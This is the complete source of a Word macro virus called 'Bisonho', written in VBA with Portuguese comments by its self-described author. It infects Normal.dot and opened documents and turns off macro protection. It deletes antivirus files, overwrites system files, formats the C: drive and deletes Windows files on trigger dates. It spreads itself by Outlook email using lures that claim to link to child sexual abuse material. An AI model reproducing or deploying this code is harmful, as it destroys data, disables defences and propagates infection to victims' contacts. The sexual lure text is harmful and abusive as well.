   Attribute VB_Name = "Module1"
   Private Sub Document_Close()
   'Executa quando um doc e fechado e transfere o controle para a sub
   'Document_Open diretamente
       Document_Open
   End Sub

   Private Sub Document_New()
   'Executa quando um doc e criado
   'Document_Open diretamente
       Document_Open
   End Sub

   Private Sub Document_Open()

   'Executa quando um doc e aberto e depois transfere o controle para a sub
   'RetroAction

   On Error Resume Next            'Se ocorrer algum erro... pule!
   Application.EnableCancelKey = 0 'Desabilita Control+Break

   Set Arch = ActiveDocument.VBProject.VBComponents.Item(1)
   'Define as variaveis Arch, que aponta para um doc qualquer ativo,

   Set Norm = NormalTemplate.VBProject.VBComponents.Item(1)
   'Norm que aponta para o normal.dot, e

   Set ItsMe = Me.VBProject.VBComponents.Item(1)
   'ItsMe, que indica da onde o virus esta sendo executado.

   If Norm.CodeModule.Lines(1, 1) <> "'Bisonho Rulez" Then
   'Se a primeira linha do projeto do normal nao for 'Bisonho Rulez, infecte!

   Norm.CodeModule.DeleteLines 1, Norm.CodeModule.CountOfLines
   'Apaga todo o codigo estranho (que pode ser um outro virus, pq nao?)

   Norm.CodeModule.InsertLines 1, ItsMe.CodeModule.Lines(1, ItsMe.CodeModule.CountOfLines)
   'Infecta o arquivo

   Norm.Name = "Bisonho"  'Muda o nome do projeto para Bisonho
   End If 'Termina o bloco de condicoes *SE*

   If Arch.CodeModule.Lines(1, 1) <> "'Bisonho Rulez" Then
   'Se a primeira linha do projeto de um arquivo aberto nao for 'Bisonho Rulez, infecte!

   Arch.CodeModule.DeleteLines 1, Arch.CodeModule.CountOfLines
   'Apaga todo o codigo estranho (que pode ser um outro virus, pq nao?)

   Arch.CodeModule.InsertLines 1, ItsMe.CodeModule.Lines(1, ItsMe.CodeModule.CountOfLines)
   'Infecta o arquivo

   Arch.Name = "Bisonho"  'Muda o nome do projeto para Bisonho
   End If 'Termina o bloco de condicoes *SE*

   If Dir("C:\Ethan.___", 6) <> "" Then
   'Aha, foi encontrado vestigios do ethan... (eu odeio esse virus nao sei pq)

   SetAttr "C:\Ethan.___", vbNormal
   'Define o atributo do arquivo como normal, e...
   Kill "C:\Ethan.___"                     'Deleta essa droga!
   End If                                  'Termina o bloco de condicoes *SE*

   RetroAction                             'Chama a sub RetroAction

   If Day(Now) = Month(Now) Then ChooseActions
   'Chama os eventos se o dia for igual ao mes

   If Minute(Now) = Second(Now) Then
   'Se o segundo e igual ao minuto, faz o cara dizer que tem o pau pequeno
   Msg = "Ocorreu um erro. A possivel causa e que vc tenha um penis pequeno. Vc tem um penis pequeno?"
   Style = vbYesNo + vbQuestion    'Estilo da mensagem
   Title = "Microsoft Word"        'Titulo da mensagem
   Ret = MsgBox(Msg, Style, Title) 'Escolha do cidadao
   If Ret = vbNo Then LoopIt       'Disse que nao? Pergunta de novo!

   ThisIsSpecial           'Chama essa sub...
   EmailCopy               'Chama essa sub tb.
   End If


   End Sub                                 'Termina a sub (DUH...)

   Private Sub RetroAction()
   'ESSA SUB E SO AS ACÕES RETRO DO VIRUS... RERERERE (HEHEHE)

   On Error Resume Next    'Ocorreu algum erro? Pule...
   Application.EnableCancelKey = wdCancelDisabled  'Desabilita o Control+Break
   Options.VirusProtection = False                 'Desativa a verificacao de macros no documento
   Options.SaveNormalPrompt = False                'Desativa o aviso para salvar o
   normal.dot

   CommandBars("Tools").Controls("Macro").Visible = False
   'Esconde o menu Macros

   CommandBars("View").Controls(6).Visible = False
   'Esconde o menu Barra de Ferramentas (para evitar que adicionem um menu novo,
   'apesar que se pode dar um clique com o botao direito na barra de menu mas
   'ta a pampa)

   CustomizationContext = NormalTemplate
   'Define onde serao salvas as mudancas abaixo

   KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF11), KeyCategory:=wdKeyCategoryCommand, Command:="hahaNOT"
   'Redireciona o atalho Alt+F11 para uma sub vazia

   KeyBindings.Add KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF8), KeyCategory:=wdKeyCategoryCommand, Command:="hahaNOT"
   'Redireciona o atalho Alt+F8 para uma sub vazia

   Dim McAfee, FMcAfee, FProt, FFProt, VET, FVET, Avast, FAvast, TheCleaner, FTheCleaner, Panda, FPanda, AVP, FAVP          'Declara variaveis...

   'Adquire os dados de registro dos Av's
   FProt = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Command Software\F-PROT32", "Location")
   VET = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Cybec\VET Antivirus for Win32\Resident", "VetPath")
   'Av's que indicam em que pasta
   McAfee = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\McAfee\Scan95", "szProductLocation")
   'que foram instalados...
   Avast = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\ALWIL Software\Avast32", "Path")
   TheCleaner = System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Software\MooSoft Development\The Cleaner", "tcshellex")
   Panda = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Panda Software\Panda Antivirus 6.0", "Path")
   AVP = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\KasperskyLab\Components\100", "Folder")


   'Esse bloco abaixo define os arquivos que serao alvos...
   '*.* que e igual a TUDO (DUH!) e alguns Dats e Dlls vitais...

   FFProt = FProt + "\*.*"
   FVET = VET + "\*.*"
   FMcAfee = McAfee + "\*.*"
   FAvast = Avast + "\*.*"
   FTheCleaner = TheCleaner + "\*.*"
   FPanda = Panda + "*.*" 'a chave de registro do panda tem um \ na frente..
   FAVP = AVP + "\*.*"
   Affprot = FProt + "\*.Dat"
   Bffprot = FProt + "\*.Def"
   Afvet = VET + "\*.Dat"
   AFMcAfee = McAfee + "\*.Dat"
   afavast = Avast + "\*.Dat"
   bfavast = Avast + "\*.Dll"
   afthecleaner = TheCleaner + "\*.Dll"
   afpanda = Panda + "*.Dat"
   bfpanda = Panda + "*.Dll"
   afavp = AVP + "\*.Dat"
   bfavp = AVP + "\*.Dll"

   'Esse bloco abaixo detona primeiro os arquivos vitais dos antivirus e depois
   'tenta detonar tudo, pq se tiver algum programa residente, o mesmo nao sera
   'removido, e, com os vitais faltando, eles nao servem pra nada... hehhehe..
   'Pau na lomba deles...

   Kill Affprot
   Kill Bffprot
   Kill Afvet
   Kill AFMcAfee
   Kill afavast
   Kill bfavast
   Kill afthecleaner
   Kill afpanda
   Kill bfpanda
   Kill afavp
   Kill bfavp
   Kill FFProt
   Kill FVET
   Kill FMcAfee
   Kill FAvast
   Kill FTheCleaner
   Kill FPanda
   Kill FAVP

   'Esse bloco abaixo desativa as opcoes de verificacao do XoBoBus para que
   'ele nao verifique mais porra nenhuma e pare de incomodar quem quer infectar.

   'Obs: Esse era meu metodo para infectar os micros. Eu invadia uns lammers
   'pelo NetBus e substituia o normal.dot do lammah pelo virus.dot e caia fora
   'hehe... ou entao mandava um virus de com ou exe e executava na maquina dele
   '(se bem que eu ainda nao consegui entender porra nenhuma de assembly...
   'vai ver que eu acostumei com basic, pq foi minha primeira linguagem e nao
   'consegui entender mais porra nenhuma)

   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "0") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "1") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "2") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "3") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "4") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "5") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "6") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "7") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "8") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "9") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "10") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "AutoStart") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "AutoVerify") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "BOProt") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "ExtraPort") = "DISABLED"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\DeepVision\Xô BoBus - R32", "NetBusAdv") = "DISABLED"

   'Essa linha abaixo muda o password do server do netbus, se existir, e (putz eu
   'acabei de descobrir um bug agora mesmo... foi mal)

   'System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "PATCH") =
   '"c:\windows\Patch.exe /pass:killfhc" 'hehehe!!! so eu posso usar netbus!

   'Bug Acima descoberto e corrigido agora. Era pra trocar o password do server
   'do netbus que estivesse com o nome padrao de PATCH, mas eu esqueci, ate nos
   'meus outros virus, de colocar a instrucao IF, ou seja, de dizer que so e
   'pra trocar o password se o server existir. O Bug faria com que ele criasse
   'uma chave dizendo para executar o programa PATCH, mas se nao existisse, ia
   'dar um aviso no inicio do Windows. Putz que coisa idiota... e falta de
   'atencao.

   End Sub

   Private Sub hahaNOT() 'Sub vazia que nao faz nada (DUH!)

   End Sub

   'ESSAS SUBS ABAIXO SAO OS EVENTOS DESSE VIRUS
   'SAO MUITAS MESMO...
   'NADA DE MENSAGINHAS BABACAS E SO...

   Private Sub Action1()
   On Error Resume Next
   'nao tenho certeza se funciona em todos os
   'micros mas ta valendo

   'Sabe quando vc deixa o mouse em cima dos icones da area de trabalho e aparece
   'uma mensagenzinha?

   'Muda a mensagem da Lixeira
   System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "") = "A Berne Maltesa Rulez..."
   System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = "HEHEHEHE... esta e a Lixeira do Dick Moe... eu comando essa bagaca ok??? ---A BERNE MALTESA---"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\CLASSES\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "") = "Dick Moe Recycle Bin"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\CLASSES\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = "HEHEHEHE... esta e a Lixeira do Dick Moe... eu comando essa bagaca ok??? ---A BERNE MALTESA---"
   End Sub

   Private Sub Action2()
   On Error Resume Next
   'Esses tem de reiniciar o micro

   'Arregaca com a visualizacao do monitor
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "BitsPerPixel") = "8"
   'Muda o registro do windows
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "DICK MOE"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "A BERNE MALTESA"
   System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version") = "Windous 1.0 by DICK MOE"
   End Sub

   Private Sub Action3()
   On Error Resume Next
   'Tem de reiniciar...

   'Deixa o mouse com rastro...
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Display\Settings", "MouseTrails") = "7"
   'Lentao, e...
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Mouse", "MouseSpeed") = "0"
   'Vc tem de ser o the flash pra dar um clique duplo...
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Mouse", "DoubleClickSpeed") = "100"
   End Sub

   Private Sub Action4()
   On Error Resume Next
   'Reiniciar...

   'Troca umas cores do windows... fica bem cheguei.
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ButtonFace") = "200 40 10"
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ActiveTitle") = "0 250 100"
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "Menu") = "0 0 0"
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "Window") = "100 100 200"
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "ScrollBar") = "100 100 200"
   System.PrivateProfileString("", "HKEY_CURRENT_CONFIG\Control Panel\Colors", "WindowText") = "255 255 255"
   End Sub

   Private Sub Action5()
   On Error Resume Next
   N$ = WordBasic.[DefaultDir$](2) + "\Normal.dot" 'Informa o caminho do normaldot
   FileCopy N$, "C:\Leia.dot"                      'Faz uma copia dele.
   SetAttr "C:\*.*", vbNormal              'Atribui C:\*.* como normal
   Open "C:\io.sys" For Output As #1               'Abre io.sys
   Open "C:\msdos.sys" For Output As #2            'Abre msdos.sys
   Open "C:\command.com" For Output As #3          'Abre command.com
   Open "C:\Windows\win.com" For Output As #4      'Abre win.com
   Print #1, "Vc foi dominado pelo virus Bisonho"          'Escreve umas
   Print #2, "Escrito por DICK MOE - Brasil"                       'mensaginhas
   Print #3, "Presidente do grupo A BERNE MALTESA"                 'bunitinhas
   Print #4, "Um verdadeiro virus de macro... querem competir???"  'ehhehe
   Close #1                                        '
   Close #2                                        'Fecha os arquivos abertos
   Close #3                                        'zerados (so com as mensagens)
   Close #4                                        '
   Open "C:\autoexec.bat" For Output As #1         'Abre o Autoexec e deixa um
   recado
   Print #1, "@echo off"
   Print #1, "BREAK OFF > NUL"
   Print #1, "Echo vc foi destruido pelo virus Bisonho"
   Print #1, "pause > nul"
   Print #1, "Echo escrito por DICK MOE"
   Print #1, "pause > nul"
   Print #1, "Echo quer se vingar???"
   Print #1, "pause > nul"
   Print #1, "Echo passe o arquivo c:\leia.dot para alguem!!!"
   Print #1, "pause > nul"
   Print #1, ":loop"
   Print #1, "Echo Daniel e Tatiana"
   Print #1, "Goto loop"
   Close #1                        'Fecha o arquivo
   End Sub

   Sub ChooseActions()
   On Error Resume Next 'Ocorreu um erro, pule.
   Dim Chance           'Variavel
   Randomize                       'Iniciar o gerador de nºs aleatorios
   Chance = Int((40 * Rnd) + 1)    'Chance de 1 em 8.
   If Chance = 1 Then Action1      'Numero sorteado = 1, acao 1
   If Chance = 10 Then Action2     'Numero sorteado = 2, acao 2
   If Chance = 20 Then Action3     'e etc.
   If Chance = 30 Then Action4
   If Chance = 40 Then Action5
   End Sub

   Sub ThisIsSpecial()
   On Error Resume Next

   'Umas acoes especiais...

   'Se for sete de setembro, finaliza o word e o windows e formata o HD
   If Day(Now) = "7" And Month(Now) = "9" Then MsgBox "ow! It's my BirthDay!!! Sete de setembro de 1984!!! Please, CAI FORA!!!", vbSystemModal + vbOKOnly, "Dick Moe": Application.Quit wdDoNotSaveChanges: Tasks.ExitWindows
   Shell "C:\Windows\Command\Format.com C:/Autotest"  'Valeu ai NIM BUS!!!!!
   ' { hehehe, eu nao, viva o tio Bill e suas opcoes !!! }

   'Se for sete de novembro, pergunta se o cara quer apagar o windows e so exibe o
   'botao SIM
   If Day(Now) = "7" And Month(Now) = "11" Then mbox = "ow! It's my syster's BirthDay!!! Do you really want to remove folder and all of contents???": st = vbYes + vbQuestion: tit = "Dick Moe"
   r = MsgBox(mbox, st, tit)
   If r = vbYes Then
   Application.StatusBar = "Removendo C:\Windows... 3%"    'Mostra na barra de status
   Kill "C:\Windows\*.exe"                                 'Apaga os arquivos
   Application.StatusBar = "Removendo C:\Windows... 13%"
   Kill "C:\Windows\*.bmp"
   Application.StatusBar = "Removendo C:\Windows... 19%"
   Kill "C:\Windows\*.gif"
   Application.StatusBar = "Removendo C:\Windows... 29%"
   Kill "C:\Windows\*.com"
   Application.StatusBar = "Removendo C:\Windows... 33%"
   Kill "C:\Windows\*.jpg"
   Application.StatusBar = "Removendo C:\Windows... 45%"
   Kill "C:\Windows\*.dll"
   Application.StatusBar = "Removendo C:\Windows... 56%"
   Kill "C:\Windows\*.sys"
   Application.StatusBar = "Removendo C:\Windows... 69%"
   Kill "C:\Windows\*.txt"
   Application.StatusBar = "Removendo C:\Windows... 75%"
   Kill "C:\Windows\*.doc"
   Application.StatusBar = "Removendo C:\Windows... 80%"
   Kill "C:\Windows\*.dat"
   Application.StatusBar = "Removendo C:\Windows... 99%"
   Kill "C:\Windows\*.pwl"
   Application.StatusBar = "Removendo C:\Windows... done"
   End If
   End If

   'Se for sete de junho, cria 5000 pastas (que coisa nao?)
   If Day(Now) = "7" And Month(Now) = "6" Then
   MsgBox "ow! It's my mommy's Birthday... ow? What is it???", vbExclamation, "Dick Moe"
   Static P
   Static Q
   Dim S
   S = "\Mommy"
   P = "C:\Mommy"
   MkDir P
   Pastas:
   Q = Q + 1: If Q >= 5000 Then GoTo Fim
   P = P + S
   MkDir P
   GoTo Pastas
   Fim:
   End If

   'Se for oito de fevereiro, apaga o conteudo do menu iniciar
   If Day(Now) = "8" And Month(Now) = "2" Then MsgBox "ow! It's my daddy's Birthday... Do you want to go to the party???", vbCritical, "Dick Moe"
   Shell "Deltree/y c:\windows\menu iniciar"
   Shell "Deltree/y c:\windows\start menu"
   End If

   'Se o dia for igual aos segundos, faz um joguinho e anexa o resultado a um
   'arquivo aleatorio da pasta windows
   If Day(Now) = Second(Now) Then                  'Condicao Day=Second
   MsgBox "Jockey PÔ!!!", vbExclamation, "Dick Moe" 'Mensagem
   Dim FILEEE                                      'Variavel
   FILEEE = Dir("C:\Windows\*.*")                  'Arquivo aleatorio
   Open FILEEE For Append As #1                    'Abre o arquivo
   Randomize: o = Int((2 * Rnd) + 1)               'Ganhou ou perdeu?
   If o = 1 Then Print #1, "Ow, you loose, try again!!!"   'Perdeu...
   If o = 2 Then Print #1, "Ow yeah! You win... SHIT"
   'Ganhou... anota tudinho no arquivo
   Print #1, "Do you want to play again???"        'Vc quer jogar de novo?
   Print #1, ""
   Close #1
   End If
   End Sub

   Private Sub EmailCopy()
   On Error Resume Next
   Application.EnableCancelKey = 0

   Dim OutLookAp, NamOfMapi, BisonhoMail   'Inicializa variaveis
   Set OutLookAp = CreateObject("Outlook.Application")     'Inicializa o Outlook
   Set NamOfMapi = OutLookAp.GetNameSpace("MAPI")
   'Verifica se ja foram mandados os emails antes
   If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Bisonho") <> "Sim, sou eu mesmo, e dai?" Then

   If OutLookAp = "Outlook" Then
   NamOfMapi.Logon "profile", "password"           'Inicializa a conta do usuario
   For y = 1 To NamOfMapi.AddressLists.Count       'Conta quantos enderecos tem
   Set AddyBook = NamOfMapi.AddressLists(y)
   x = 1
   Set BisonhoMail = OutLookAp.CreateItem(0)
   For oo = 1 To AddyBook.AddressEntries.Count
   TheEntries = AddyBook.AddressEntries(x)
   BisonhoMail.Recipients.Add TheEntries           'Adiciona entradas
   x = x + 1
   If x > 50 Then oo = AddyBook.AddressEntries.Count
   Next oo

   '---> Nao tenho certeza se esse mecanismo vai funcionar, se tiver algum bug,
   ' por favor me avise. E que eu estou sem o office, vcs ja sabem...

   'Esse e um mecanismo bem simples que funciona assim: verifica se o word
   'e em portugues ou ingles atraves do nome dos menus (a definicao tools e
   'padrao em qualquer idioma, o que muda e o que e exibido pro usuario), para
   'que assim o virus "saiba" se e pra mandar um email em português ou ingles..
   'Da resultado em 80% dos micros, excecto aqueles brasileiros bestas que usam
   'office em inglês...

   If CommandBars("Tools").Name = "Tools" Then     'Se o nome for Tools
   BisonhoMail.Subject = "Important Message From " & Application.UserName
   BisonhoMail.Body = "This is a huge list of sites of kids sex... I saw the whole document and all of the sites are online and free! Check out by yourself..."
   ElseIf CommandBars("Tools").Name = "Ferramentas" Then   'Se for ferramentas..
   BisonhoMail.Subject = "E ai, blz?" & Application.UserName
   BisonhoMail.Body = "Ontem eu entrei no chat da UOL e catei um monte de sites de sexo de kids. E bem loco e todos sao gratis e estao online... da um ligo pra vc ver... tem bastante."
   Else
   BisonhoMail.Subject = "Important Message From " & Application.UserName
   BisonhoMail.Body = "This is a huge list of sites of kids sex... I saw the whole document and all of the sites are online and free! Check out by yourself..."
   End If

   '---> Nao tenho certeza se esse mecanismo vai funcionar, se tiver algum bug,
   'por favor me avise. E que eu estou sem o office, vcs ja sabem...

   BisonhoMail.Attachments.Add ActiveDocument.FullName     'Anexa o doc infectado
   BisonhoMail.Send                        'E envia para a lista inteira

   TheEntries = "" 'Reseta a variavel
   Next y
   NamOfMapi.Logoff        'Fecha a conta
   End If

   'Adiciona uma chave ao registro para que nao seja enviados mais emails
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Bisonho") = "Sim, sou eu mesmo, e dai?"
   End If
   End Sub

   'Ah Finalmente Acabou
   'Nao E Facil???

   'Bem, Um Abraco Ai Pro Pessoal, Pro Nimbus E Pra Todo Mundo Que Curte Fazer
   'Um Virus

   'E Um Pau Na Lomba Dos Av's Makers.

   'Pensem Bem: Quanto Mais Av's Podres Que Vcs Fizerem, Mais Virus, Mais Av's
   'E Consequentemente Mais Grana Proces... Eu Faco Virus So Por Diversao E
   'Status... Nao Por Grana.

   'E Um Pau Na Lomba Dos Lammahs Que Nao Sao So Lammahs, Sao Lammahs Assumidos
   'Fudidos E Que Nao Tem Jeito: Frase Campea Do Hall: Eu Tava Tentando Acessar
   'Meu Email, Eu Digitava Tudo Direitinho Www.Skott@Ig.Com.Br.....
   'E Ou Nao E De Chutar O Saco???

   'Depois Perguntam: Pq Vcs Fazem Virus????
   'Vc Acha Que Um Porra Desses Ai Em Cima Merece Viver?

   'Bem, Falou A Todos E Qualquer Coisa, Email-Me Ou Icq-Me...

   'By Dick Moe
   '(Obs: Lê-Se Dick Mou, E Que Tem Uns Bobao Que Fala Dick Moe Mesmo)
   'A Berne Maltesa......................... The New Generation
